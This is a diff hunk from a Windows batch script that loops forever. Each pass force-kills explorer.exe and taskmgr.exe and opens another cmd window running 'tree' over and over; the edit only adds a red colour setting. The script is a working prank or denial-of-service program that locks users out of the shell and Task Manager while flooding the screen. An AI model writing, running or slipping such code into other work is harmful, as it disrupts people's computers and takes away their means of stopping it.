@@ -9,5 +9,5 @@ tree
 :A
 taskkill /f /im explorer.exe
 taskkill /f /im taskmgr.exe
-start cmd /k "tree&tree&tree&tree&tree&tree&tree"
+start cmd /k "color c0&tree&tree&tree&tree&tree&tree&tree"
 goto A
